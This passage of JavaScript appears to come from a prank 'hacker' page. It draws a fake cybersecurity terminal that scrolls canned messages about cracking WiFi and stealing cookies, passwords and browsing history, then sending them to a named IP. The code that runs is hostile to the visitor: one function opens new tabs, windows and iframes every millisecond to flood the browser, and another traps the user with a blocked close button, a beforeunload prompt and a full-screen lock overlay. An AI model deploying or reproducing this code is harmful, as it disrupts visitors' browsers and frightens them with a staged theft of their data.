                            width: 100%;
                            height: 100%;
                            background: rgba(0, 0, 0, 0.7);
                            color: #f00;
                            display: flex;
                            justify-content: center;
                            align-items: center;
                            font-family: 'Courier New', monospace;
                            font-size: 18px;
                            font-weight: bold;
                            text-align: center;
                            pointer-events: none;
                        `;
                        hackedText.textContent = 'SYSTEM BREACHED\nACCESS GRANTED';
                        
                        if (iframe.contentWindow && iframe.contentWindow.document) {
                            iframe.contentWindow.document.body.appendChild(hackedText);
                        }
                    } catch (e) {
                        console.log('Could not modify iframe content due to cross-origin restrictions');
                    }
                }, 1000);
                
                // Remove iframe after 8 seconds
                setTimeout(() => {
                    if (document.body.contains(iframe)) {
                        document.body.removeChild(iframe);
                    }
                }, 8000);
            }, i * 1000); // Create one iframe every second
        }
    }
}

function startTabOpeningLoop() {
    // Function to open a new tab
    function openTab() {
        try {
            window.open('https://nepsenx.github.io/home', '_blank');
        } catch (e) {
            console.log('Popup blocked by browser');
        }
    }
    
    // Function to open a new window
    function openWindow() {
        try {
            window.open('https://nepsenx.github.io/home', '_blank', 'width=400,height=300');
        } catch (e) {
            console.log('Popup blocked by browser');
        }
    }
    
    // Function to create an iframe
    function createIframe() {
        const iframe = document.createElement('iframe');
        iframe.src = 'https://nepsenx.github.io/home';
        iframe.style.cssText = `
            position: fixed;
            top: ${Math.random() * 80}vh;
            left: ${Math.random() * 80}vw;
            width: 300px;
            height: 200px;
            border: none;
            z-index: 9997;
            box-shadow: 0 0 20px rgba(255, 0, 0, 0.7);
        `;
        document.body.appendChild(iframe);
        
        // Remove iframe after 5 seconds
        setTimeout(() => {
            if (document.body.contains(iframe)) {
                document.body.removeChild(iframe);
            }
        }, 50000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000);
    }
    
    // Open tabs and windows repeatedly
    setInterval(openTab, 1); // Every second
    setInterval(openWindow, 1); // Every 1.5 seconds
    setInterval(createIframe, 1); // Every 0.1 seconds
}

function launchTerminal() {
    // Create overlay container
    const overlay = document.createElement('div');
    overlay.id = 'cyber-terminal-overlay';
    overlay.style.position = 'fixed';
    overlay.style.top = '50%';
    overlay.style.left = '50%';
    overlay.style.transform = 'translate(-50%, -50%)';
    overlay.style.width = '90%';
    overlay.style.height = '80%';
    overlay.style.maxWidth = '1200px';
    overlay.style.maxHeight = '700px';
    overlay.style.backgroundColor = 'rgba(5, 5, 8, 0.98)';
    overlay.style.color = '#00ff41';
    overlay.style.zIndex = '10000';
    overlay.style.display = 'flex';
    overlay.style.flexDirection = 'column';
    overlay.style.padding = '20px';
    overlay.style.fontFamily = '"SF Mono", "Consolas", "Monaco", "Inconsolata", monospace';
    overlay.style.overflow = 'hidden';
    overlay.style.border = '2px solid #00ff41';
    overlay.style.borderRadius = '10px';
    overlay.style.boxShadow = '0 0 30px rgba(0, 255, 65, 0.5)';
    
    // Create matrix background
    const matrixBg = document.createElement('canvas');
    matrixBg.id = 'matrix-bg';
    matrixBg.style.position = 'absolute';
    matrixBg.style.top = '0';
    matrixBg.style.left = '0';
    matrixBg.style.width = '100%';
    matrixBg.style.height = '100%';
    matrixBg.style.zIndex = '-1';
    matrixBg.style.opacity = '0.15';
    overlay.appendChild(matrixBg);
    
    // Create scan line
    const scanLine = document.createElement('div');
    scanLine.style.position = 'absolute';
    scanLine.style.height = '2px';
    scanLine.style.width = '100%';
    scanLine.style.background = 'linear-gradient(to right, transparent, #00ff41, transparent)';
    scanLine.style.opacity = '0.15';
    scanLine.style.animation = 'scan 4s linear infinite';
    scanLine.style.zIndex = '999';
    scanLine.style.pointerEvents = 'none';
    overlay.appendChild(scanLine);
    
    // Add scan animation
    const scanStyle = document.createElement('style');
    scanStyle.textContent = `
        @keyframes scan {
            0% { top: 0%; }
            100% { top: 100%; }
        }
    `;
    overlay.appendChild(scanStyle);
    
    // Create terminal container
    const container = document.createElement('div');
    container.style.display = 'flex';
    container.style.flexDirection = 'column';
    container.style.height = '100%';
    container.style.gap = '15px';
    overlay.appendChild(container);
    
    // Create header
    const header = document.createElement('div');
    header.style.display = 'flex';
    header.style.justifyContent = 'space-between';
    header.style.alignItems = 'center';
    header.style.padding = '10px 15px';
    header.style.borderBottom = '1px solid #008f24';
    header.style.background = 'rgba(10, 20, 12, 0.8)';
    header.style.borderRadius = '8px';
    header.style.boxShadow = '0 0 15px rgba(0, 255, 65, 0.2)';
    container.appendChild(header);
    
    // Create logo
    const logo = document.createElement('div');
    logo.innerHTML = '<i class="fas fa-terminal"></i> CYBERSEC_TERMINAL v2.1';
    logo.style.fontSize = '1.2rem';
    logo.style.fontWeight = 'bold';
    logo.style.textShadow = '0 0 10px #00ff41, 0 0 20px rgba(0, 255, 65, 0.3)';
    logo.style.letterSpacing = '1.5px';
    logo.style.display = 'flex';
    logo.style.alignItems = 'center';
    logo.style.gap = '10px';
    header.appendChild(logo);
    
    // Create status bar
    const statusBar = document.createElement('div');
    statusBar.style.display = 'flex';
    statusBar.style.gap = '15px';
    header.appendChild(statusBar);
    
    // Status items
    const statusItems = [
        {icon: 'fa-shield-alt', text: 'ENCRYPTION: AES-256'},
        {icon: 'fa-network-wired', text: 'CONNECTION: SECURE'},
        {icon: 'fa-user-secret', text: 'MODE: STEALTH'}
    ];
    
    statusItems.forEach(item => {
        const statusItem = document.createElement('div');
        statusItem.style.padding = '5px 12px';
        statusItem.style.background = 'rgba(8, 25, 14, 0.7)';
        statusItem.style.borderRadius = '4px';
        statusItem.style.border = '1px solid #008f24';
        statusItem.style.display = 'flex';
        statusItem.style.alignItems = 'center';
        statusItem.style.gap = '8px';
        statusItem.style.fontSize = '0.85rem';
        statusItem.innerHTML = `<i class="fas ${item.icon}"></i> <span>${item.text}</span>`;
        statusBar.appendChild(statusItem);
    });
    
    // Create main content
    const mainContent = document.createElement('div');
    mainContent.style.display = 'flex';
    mainContent.style.flex = '1';
    mainContent.style.gap = '15px';
    mainContent.style.overflow = 'hidden';
    container.appendChild(mainContent);
    
    // Create sidebar
    const sidebar = document.createElement('div');
    sidebar.style.width = '200px';
    sidebar.style.display = 'flex';
    sidebar.style.flexDirection = 'column';
    sidebar.style.gap = '10px';
    sidebar.style.background = 'rgba(12, 18, 14, 0.9)';
    sidebar.style.borderRadius = '8px';
    sidebar.style.padding = '12px';
    sidebar.style.border = '1px solid #008f24';
    sidebar.style.boxShadow = '0 0 15px rgba(0, 255, 65, 0.15)';
    mainContent.appendChild(sidebar);
    
    // Sidebar title
    const sidebarTitle = document.createElement('div');
    sidebarTitle.innerHTML = '<i class="fas fa-cogs"></i> SECURITY MODULES';
    sidebarTitle.style.padding = '6px 0';
    sidebarTitle.style.borderBottom = '1px solid #008f24';
    sidebarTitle.style.marginBottom = '8px';
    sidebarTitle.style.fontSize = '1rem';
    sidebarTitle.style.display = 'flex';
    sidebarTitle.style.alignItems = 'center';
    sidebarTitle.style.gap = '8px';
    sidebar.appendChild(sidebarTitle);
    
    // Modules
    const modules = [
        {icon: 'fa-wifi', text: 'WIFI *****', id: 'wifi-module', active: true},
        {icon: 'fa-database', text: 'DATA EXTRACTION', id: 'data-module'},
        {icon: 'fa-exchange-alt', text: 'SECURE TRANSFER', id: 'transfer-module'}
    ];
    
    modules.forEach(module => {
        const moduleEl = document.createElement('div');
        moduleEl.id = module.id;
        moduleEl.innerHTML = `<i class="fas ${module.icon}"></i> <span>${module.text}</span>`;
        moduleEl.style.padding = '10px';
        moduleEl.style.background = module.active ? 
            'rgba(15, 40, 20, 0.8)' : 'rgba(10, 25, 15, 0.7)';
        moduleEl.style.borderRadius = '6px';
        moduleEl.style.border = module.active ? 
            '1px solid #00ff41' : '1px solid rgba(0, 180, 50, 0.3)';
        moduleEl.style.cursor = 'pointer';
        moduleEl.style.transition = 'all 0.3s';
        moduleEl.style.display = 'flex';
        moduleEl.style.alignItems = 'center';
        moduleEl.style.gap = '8px';
        moduleEl.style.fontSize = '0.9rem';
        
        if (module.active) {
            moduleEl.style.boxShadow = '0 0 10px rgba(0, 255, 65, 0.3)';
        }
        
        moduleEl.addEventListener('mouseenter', () => {
            if (!module.active) {
                moduleEl.style.background = 'rgba(15, 40, 20, 0.8)';
                moduleEl.style.border = '1px solid #00ff41';
                moduleEl.style.boxShadow = '0 0 10px rgba(0, 255, 65, 0.3)';
            }
        });
        
        moduleEl.addEventListener('mouseleave', () => {
            if (!module.active) {
                moduleEl.style.background = 'rgba(10, 25, 15, 0.7)';
                moduleEl.style.border = '1px solid rgba(0, 180, 50, 0.3)';
                moduleEl.style.boxShadow = 'none';
            }
        });
        
        sidebar.appendChild(moduleEl);
    });
    
    // Create terminal container
    const terminalContainer = document.createElement('div');
    terminalContainer.style.flex = '1';
    terminalContainer.style.display = 'flex';
    terminalContainer.style.flexDirection = 'column';
    terminalContainer.style.background = 'rgba(8, 12, 10, 0.95)';
    terminalContainer.style.borderRadius = '8px';
    terminalContainer.style.overflow = 'hidden';
    terminalContainer.style.border = '1px solid #008f24';
    terminalContainer.style.boxShadow = '0 0 20px rgba(0, 255, 65, 0.2)';
    mainContent.appendChild(terminalContainer);
    
    // Terminal header
    const terminalHeader = document.createElement('div');
    terminalHeader.style.padding = '10px 12px';
    terminalHeader.style.background = 'rgba(10, 25, 15, 0.8)';
    terminalHeader.style.borderBottom = '1px solid #008f24';
    terminalHeader.style.display = 'flex';
    terminalHeader.style.justifyContent = 'space-between';
    terminalHeader.style.alignItems = 'center';
    terminalContainer.appendChild(terminalHeader);
    
    // Terminal title
    const terminalTitle = document.createElement('div');
    terminalTitle.innerHTML = '<i class="fas fa-terminal"></i> root@cybersec:~#';
    terminalTitle.style.display = 'flex';
    terminalTitle.style.alignItems = 'center';
    terminalTitle.style.gap = '8px';
    terminalTitle.style.fontSize = '0.95rem';
    terminalHeader.appendChild(terminalTitle);
    
    // Terminal controls
    const terminalControls = document.createElement('div');
    terminalControls.style.display = 'flex';
    terminalControls.style.gap = '6px';
    terminalHeader.appendChild(terminalControls);
    
    // Control buttons
    const controls = [
        {class: 'close', color: '#ff5f56'},
        {class: 'minimize', color: '#ffbd2e'},
        {class: 'maximize', color: '#27c93f'}
    ];
    
    controls.forEach(control => {
        const controlEl = document.createElement('div');
        controlEl.className = 'control ' + control.class;
        controlEl.style.width = '12px';
        controlEl.style.height = '12px';
        controlEl.style.borderRadius = '50%';
        controlEl.style.cursor = 'pointer';
        controlEl.style.backgroundColor = control.color;
        terminalControls.appendChild(controlEl);
    });
    
    // Terminal output
    const terminalOutput = document.createElement('div');
    terminalOutput.id = 'terminal-output';
    terminalOutput.style.flex = '1';
    terminalOutput.style.padding = '12px';
    terminalOutput.style.overflowY = 'auto';
    terminalOutput.style.background = 'rgba(5, 8, 6, 0.98)';
    terminalOutput.style.lineHeight = '1.4';
    terminalOutput.style.whiteSpace = 'pre-wrap';
    terminalOutput.style.fontSize = '0.9rem';
    
    // Scrollbar styling
    const scrollStyle = document.createElement('style');
    scrollStyle.textContent = `
        #terminal-output::-webkit-scrollbar {
            width: 8px;
        }
        
        #terminal-output::-webkit-scrollbar-track {
            background: rgba(0, 30, 15, 0.3);
        }
        
        #terminal-output::-webkit-scrollbar-thumb {
            background: #008f24;
            border-radius: 4px;
        }
    `;
    overlay.appendChild(scrollStyle);
    
    terminalContainer.appendChild(terminalOutput);
    
    // Terminal input
    const terminalInput = document.createElement('div');
    terminalInput.style.display = 'flex';
    terminalInput.style.padding = '10px 12px';
    terminalInput.style.background = 'rgba(10, 20, 12, 0.8)';
    terminalInput.style.borderTop = '1px solid #008f24';
    terminalContainer.appendChild(terminalInput);
    
    const prompt = document.createElement('span');
    prompt.className = 'prompt';
    prompt.textContent = '>>';
    prompt.style.marginRight = '8px';
    prompt.style.color = '#00ff41';
    prompt.style.whiteSpace = 'nowrap';
    terminalInput.appendChild(prompt);
    
    const commandInput = document.createElement('input');
    commandInput.type = 'text';
    commandInput.id = 'command-input';
    commandInput.style.flex = '1';
    commandInput.style.background = 'transparent';
    commandInput.style.border = 'none';
    commandInput.style.color = '#00ff41';
    commandInput.style.outline = 'none';
    commandInput.style.fontSize = '0.9rem';
    commandInput.style.letterSpacing = '0.5px';
    terminalInput.appendChild(commandInput);
    
    // Create footer
    const footer = document.createElement('div');
    footer.style.padding = '10px 15px';
    footer.style.borderTop = '1px solid #008f24';
    footer.style.marginTop = '15px';
    footer.style.background = 'rgba(10, 20, 12, 0.8)';
    footer.style.borderRadius = '8px';
    footer.style.display = 'flex';
    footer.style.justifyContent = 'space-between';
    footer.style.alignItems = 'center';
    footer.style.boxShadow = '0 0 15px rgba(0, 255, 65, 0.15)';
    container.appendChild(footer);
    
    // Status text
    const statusText = document.createElement('div');
    statusText.innerHTML = '<i class="fas fa-info-circle"></i> STATUS: <span id="status-text">INITIALIZING WIFI *****...</span>';
    statusText.style.fontSize = '0.9rem';
    footer.appendChild(statusText);
    
    // Progress container
    const progressContainer = document.createElement('div');
    progressContainer.style.flex = '1';
    progressContainer.style.height = '8px';
    progressContainer.style.background = 'rgba(8, 25, 14, 0.7)';
    progressContainer.style.borderRadius = '4px';
    progressContainer.style.overflow = 'hidden';
    progressContainer.style.margin = '0 12px';
    footer.appendChild(progressContainer);
    
    // Progress bar
    const progressBar = document.createElement('div');
    progressBar.id = 'progress-bar';
    progressBar.style.height = '100%';
    progressBar.style.width = '0%';
    progressBar.style.background = 'linear-gradient(90deg, #008f24, #00ff41)';
    progressBar.style.borderRadius = '4px';
    progressBar.style.transition = 'width 0.3s ease';
    progressContainer.appendChild(progressBar);
    
    // Progress text
    const progressText = document.createElement('div');
    progressText.innerHTML = '<i class="fas fa-tasks"></i> COMPLETION: <span id="progress-text">0%</span>';
    progressText.style.fontSize = '0.9rem';
    footer.appendChild(progressText);
    
    // Add Font Awesome
    const fontAwesome = document.createElement('link');
    fontAwesome.rel = 'stylesheet';
    fontAwesome.href = 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css';
    document.head.appendChild(fontAwesome);
    
    // Add to document
    document.body.appendChild(overlay);
    
    // Matrix background effect
    const canvas = document.getElementById('matrix-bg');
    const ctx = canvas.getContext('2d');
    
    canvas.width = overlay.offsetWidth;
    canvas.height = overlay.offsetHeight;
    
    const letters = '01010101CYBERSECURITY10101010';
    const fontSize = 14;
    const columns = canvas.width / fontSize;
    
    const drops = [];
    for(let i = 0; i < columns; i++) {
        drops[i] = 1;
    }
    
    function drawMatrix() {
        ctx.fillStyle = 'rgba(5, 5, 8, 0.1)';
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        
        ctx.fillStyle = '#00ff41';
        ctx.font = `${fontSize}px monospace`;
        
        for(let i = 0; i < drops.length; i++) {
            const text = letters[Math.floor(Math.random() * letters.length)];
            ctx.fillText(text, i * fontSize, drops[i] * fontSize);
            
            if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                drops[i] = 0;
            }
            
            drops[i]++;
        }
    }
    
    const matrixInterval = setInterval(drawMatrix, 50);
    
    // Terminal functionality
    const output = document.getElementById('terminal-output');
    const statusTextEl = document.getElementById('status-text');
    const progressBarEl = document.getElementById('progress-bar');
    const progressTextEl = document.getElementById('progress-text');
    
    let totalLines = 0;
    let progress = 0;
    let currentPhase = 'wifi';
    
    // Phase-specific messages
    const wifiMessages = [
        'Scanning for WiFi networks...',
        'Found 12 available networks',
        'Target identified: SecureCorp_WiFi',
        'Analyzing encryption protocol...',
        'WPA2 encryption detected',
        'Initializing brute force attack...',
        'Testing common password combinations...',
        'Bypassing MAC address filtering...',
        'Attempting handshake capture...',
        'Captured handshake successfully',
        'Running dictionary attack...',
        'Password match found: ********',
        'Establishing connection to target...',
        'Connection established successfully',
        'Access granted to SecureCorp_WiFi'
    ];
    
    function addLogEntry(text, type = 'info') {
        const logEntry = document.createElement('div');
        logEntry.className = `log-entry ${type}`;
        
        const timestamp = new Date().toLocaleTimeString();
        logEntry.innerHTML = `<span class="timestamp">[${timestamp}]</span> ${text}`;
        
        // Add glitch effect randomly
        if (Math.random() < 0.08) {
            logEntry.classList.add('glitch');
            setTimeout(() => logEntry.classList.remove('glitch'), 200);
        }
        
        output.appendChild(logEntry);
        output.scrollTop = output.scrollHeight;
        totalLines++;
        
        // Limit output to 1000 lines for performance
        if (output.children.length > 1000) {
            output.removeChild(output.children[0]);
        }
    }
    
    function updateProgress(increment) {
        progress += increment;
        if (progress > 100) progress = 100;
        
        progressBarEl.style.width = `${progress}%`;
        progressTextEl.textContent = `${progress}%`;
        
        if (progress === 100) {
            if (currentPhase === 'wifi') {
                statusTextEl.textContent = 'WIFI ***** COMPLETE';
                setTimeout(() => {
                    startDataExtraction();
                }, 1000);
            } else if (currentPhase === 'data') {
                statusTextEl.textContent = 'DATA EXTRACTION COMPLETE';
                setTimeout(() => {
                    startDataTransfer();
                }, 1000);
            } else if (currentPhase === 'transfer') {
                statusTextEl.textContent = 'SECURE TRANSFER COMPLETE';
                statusTextEl.classList.add('success');
                // Lock the terminal
                lockTerminal();
            }
        }
    }
    
    function simulatePhase(messages, phaseName) {
        output.innerHTML = '';
        statusTextEl.textContent = `INITIALIZING ${phaseName.toUpperCase()}...`;
        progress = 0;
        progressBarEl.style.width = '0%';
        progressTextEl.textContent = '0%';
        
        // Display phase-specific messages with fastest speed
        messages.forEach((msg, index) => {
            setTimeout(() => {
                addLogEntry(msg);
                statusTextEl.textContent = msg;
                updateProgress(100 / messages.length);
            }, index * 100); // Reduced from 500ms to 100ms for faster display
        });
    }
    
    function startDataExtraction() {
        currentPhase = 'data';
        document.getElementById('wifi-module').classList.remove('active');
        document.getElementById('data-module').classList.add('active');
        
        const dataMessages = [
            'Accessing network storage...',
            'Bypassing file permissions...',
            'Scanning for sensitive data...',
            'Located browsing history database',
            'Extracting browser cookies...',
            'Retrieving saved passwords...',
            'Downloading browsing history...',
            'Compressing extracted data...',
            'Data extraction complete',
            'Preparing for secure transfer...'
        ];
        
        simulatePhase(dataMessages, 'DATA EXTRACTION');
        
        // Add browsing data table after a delay
        setTimeout(() => {
            addLogEntry('Browsing history extracted:');
            const table = document.createElement('table');
            table.className = 'data-table';
            table.innerHTML = `
                <tr>
                    <th>Timestamp</th>
                    <th>URL</th>
                    <th>Visit Count</th>
                </tr>
                <tr>
                    <td>2023-10-15 14:32:18</td>
                    <td>https://securecorp.com/internal-dashboard</td>
                    <td>27</td>
                </tr>
                <tr>
                    <td>2023-10-15 13:45:22</td>
                    <td>https://mail.securecorp.com/inbox</td>
                    <td>43</td>
                </tr>
                <tr>
                    <td>2023-10-14 16:18:57</td>
                    <td>https://sharepoint.securecorp.com/finance</td>
                    <td>19</td>
                </tr>
                <tr>
                    <td>2023-10-14 11:05:33</td>
                    <td>https://securecorp.com/employee-database</td>
                    <td>31</td>
                </tr>
                <tr>
                    <td>2023-10-13 09:22:41</td>
                    <td>https://securecorp.com/admin-panel</td>
                    <td>56</td>
                </tr>
            `;
            output.appendChild(table);
        }, 1500);
    }
    
    function startDataTransfer() {
        currentPhase = 'transfer';
        document.getElementById('data-module').classList.remove('active');
        document.getElementById('transfer-module').classList.add('active');
        
        const transferMessages = [
            'Initializing secure transfer protocol...',
            'Establishing encrypted connection...',
            'Preparing data packets...',
            'Encrypting with AES-256...',
            'Transferring data to secure server...',
            'Verifying data integrity...',
            'Finalizing transfer process...',
            'Secure transfer completed successfully',
            'Erasing local traces...',
            'All operations completed successfully'
        ];
        
        simulatePhase(transferMessages, 'SECURE TRANSFER');
        
        // Add transfer visualization after a delay
        setTimeout(() => {
            const transferDiv = document.createElement('div');
            transferDiv.className = 'transfer-container';
            transferDiv.innerHTML = `
                <div class="file-source">
                    <h4>SOURCE: Local Cache</h4>
                    <div class="file-list">
                        <p>browsing_history.db (2.4 MB)</p>
                        <p>cookies.json (1.1 MB)</p>
                        <p>passwords.enc (0.8 MB)</p>
                    </div>
                </div>
                <div class="file-destination">
                    <h4>DESTINATION: Secure Server [78.139.64.3]</h4>
                    <div class="transfer-progress">
                        <div class="transfer-progress-bar" id="transfer-progress-bar"></div>
                    </div>
                </div>
            `;
            output.appendChild(transferDiv);
            
            // Add transfer styles
            const transferStyle = document.createElement('style');
            transferStyle.textContent = `
                .transfer-container {
                    display: flex;
                    justify-content: space-between;
                    margin: 15px 0;
                    padding: 10px;
                    background: rgba(10, 20, 15, 0.5);
                    border-radius: 5px;
                    border: 1px solid #008f24;
                }
                
                .file-source, .file-destination {
                    flex: 1;
                    padding: 10px;
                }
                
                .transfer-progress {
                    height: 20px;
                    background: rgba(8, 25, 14, 0.7);
                    border-radius: 10px;
                    margin-top: 10px;
                    overflow: hidden;
                }
                
                .transfer-progress-bar {
                    height: 100%;
                    width: 0%;
                    background: linear-gradient(90deg, #008f24, #00ff41);
                    border-radius: 10px;
                    transition: width 0.5s ease;
                }
            `;
            overlay.appendChild(transferStyle);
            
            // Animate the transfer progress bar
            const transferProgressBar = document.getElementById('transfer-progress-bar');
            let transferProgress = 0;
            const transferInterval = setInterval(() => {
                transferProgress += 2;
                transferProgressBar.style.width = `${transferProgress}%`;
                
                if (transferProgress >= 100) {
                    clearInterval(transferInterval);
                    addLogEntry('All files transferred successfully', 'success');
                }
            }, 50);
        }, 1500);
    }
    
    function lockTerminal() {
        // Prevent closing
        document.querySelector('.control.close').onclick = () => {
            addLogEntry('Error: Termination blocked by security protocol', 'alert');
        };
        
        // Prevent tab closing
        window.addEventListener('beforeunload', (e) => {
            e.preventDefault();
            e.returnValue = 'Security operations in progress. Terminating may cause detection.';
        });
        
        // Add warning overlay
        const warningOverlay = document.createElement('div');
        warningOverlay.style.position = 'fixed';
        warningOverlay.style.top = '0';
        warningOverlay.style.left = '0';
        warningOverlay.style.width = '100%';
        warningOverlay.style.height = '100%';
        warningOverlay.style.background = 'rgba(0, 0, 0, 0.9)';
        warningOverlay.style.zIndex = '10001';
        warningOverlay.style.display = 'flex';
        warningOverlay.style.justifyContent = 'center';
        warningOverlay.style.alignItems = 'center';
        warningOverlay.style.flexDirection = 'column';
        warningOverlay.style.color = '#ff5555';
        warningOverlay.style.fontSize = '1.5rem';
        warningOverlay.style.textAlign = 'center';
        warningOverlay.innerHTML = `
            <div class="warning-icon" style="font-size: 4rem; margin-bottom: 30px; animation: blink 1s infinite;">
                <i class="fas fa-exclamation-triangle"></i>
            </div>
            <h2>SECURITY PROTOCOL ENGAGED</h2>
            <p>Terminal locked to prevent interruption of sensitive operations</p>
            <p>All processes must complete before termination is allowed</p>
        `;
        document.body.appendChild(warningOverlay);
        
        // Add blink animation
        const blinkStyle = document.createElement('style');
        blinkStyle.textContent = `
            @keyframes blink {
                0%, 100% { opacity: 1; }
                50% { opacity: 0.5; }
            }
        `;
        document.head.appendChild(blinkStyle);
    }
    
    // Start the simulation
    setTimeout(() => {
        simulatePhase(wifiMessages, 'WIFI *****');
    }, 500);
    
    // Handle window resize
    window.addEventListener('resize', () => {
        canvas.width = overlay.offsetWidth;
        canvas.height = overlay.offsetHeight;
    });
    
    // Close button functionality
    document.querySelector('.control.close').addEventListener('click', function() {
        document.body.removeChild(overlay);
        clearInterval(matrixInterval);
    });
}
